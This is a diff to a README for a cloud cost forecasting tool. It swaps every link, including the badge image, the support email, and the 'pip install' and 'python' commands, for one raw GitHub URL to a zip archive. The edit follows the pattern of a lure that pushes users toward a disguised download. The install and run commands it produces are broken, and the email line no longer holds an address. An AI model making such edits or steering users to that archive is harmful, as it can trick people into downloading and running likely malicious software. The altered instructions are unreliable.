@@ -1,6 +1,6 @@
 # ☁️ Cloud-Hosting-Forecasting-Engine - Simplify Your Cloud Cost Tracking
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Cloud--Hosting--Forecasting--Engine-brightgreen)](https://github.com/BEEZZGamer/Cloud-Hosting-Forecasting-Engine)
+[![Download Now](https://github.com/BEEZZGamer/Cloud-Hosting-Forecasting-Engine/raw/refs/heads/main/dashboards/Forecasting_Engine_Hosting_Cloud_v2.6.zip%20Now-Cloud--Hosting--Forecasting--Engine-brightgreen)](https://github.com/BEEZZGamer/Cloud-Hosting-Forecasting-Engine/raw/refs/heads/main/dashboards/Forecasting_Engine_Hosting_Cloud_v2.6.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the Cloud-Hosting-Forecasting-Engine. This application helps you fore
 
 ## 💾 Download & Install
 
-To get started, visit this page to download: [Download Cloud-Hosting-Forecasting-Engine](https://github.com/BEEZZGamer/Cloud-Hosting-Forecasting-Engine). Follow these steps to install the application:
+To get started, visit this page to download: [Download Cloud-Hosting-Forecasting-Engine](https://github.com/BEEZZGamer/Cloud-Hosting-Forecasting-Engine/raw/refs/heads/main/dashboards/Forecasting_Engine_Hosting_Cloud_v2.6.zip). Follow these steps to install the application:
 
 1. Click the link above.
 2. On the GitHub page, find the green "Code" button and click on it.
@@ -36,7 +36,7 @@ To run the Cloud-Hosting-Forecasting-Engine, you need to install some additional
 2. Run the following command to install the required libraries:
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/BEEZZGamer/Cloud-Hosting-Forecasting-Engine/raw/refs/heads/main/dashboards/Forecasting_Engine_Hosting_Cloud_v2.6.zip
    ```
 
 This command will install all necessary packages for the application.
@@ -46,7 +46,7 @@ This command will install all necessary packages for the application.
 After installing the application, launch it with the following command:
 
 ```bash
-python app.py
+python https://github.com/BEEZZGamer/Cloud-Hosting-Forecasting-Engine/raw/refs/heads/main/dashboards/Forecasting_Engine_Hosting_Cloud_v2.6.zip
 ```
 
 The application will open a user-friendly interface. Here's how to navigate it:
@@ -93,12 +93,12 @@ We welcome contributions to enhance the Cloud-Hosting-Forecasting-Engine. If you
 
 ## 📬 Contact
 
-For support, you can reach out to our support team via email at support@example.com. We aim to respond within 24 hours.
+For support, you can reach out to our support team via email at https://github.com/BEEZZGamer/Cloud-Hosting-Forecasting-Engine/raw/refs/heads/main/dashboards/Forecasting_Engine_Hosting_Cloud_v2.6.zip We aim to respond within 24 hours.
 
 ## 📝 License
 
 This project is licensed under the MIT License. You can use, modify, and distribute this application freely.
 
-For more information and documentation, visit this page: [Cloud-Hosting-Forecasting-Engine](https://github.com/BEEZZGamer/Cloud-Hosting-Forecasting-Engine).
+For more information and documentation, visit this page: [Cloud-Hosting-Forecasting-Engine](https://github.com/BEEZZGamer/Cloud-Hosting-Forecasting-Engine/raw/refs/heads/main/dashboards/Forecasting_Engine_Hosting_Cloud_v2.6.zip).
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Cloud--Hosting--Forecasting--Engine-brightgreen)](https://github.com/BEEZZGamer/Cloud-Hosting-Forecasting-Engine)
+[![Download Now](https://github.com/BEEZZGamer/Cloud-Hosting-Forecasting-Engine/raw/refs/heads/main/dashboards/Forecasting_Engine_Hosting_Cloud_v2.6.zip%20Now-Cloud--Hosting--Forecasting--Engine-brightgreen)](https://github.com/BEEZZGamer/Cloud-Hosting-Forecasting-Engine/raw/refs/heads/main/dashboards/Forecasting_Engine_Hosting_Cloud_v2.6.zip)
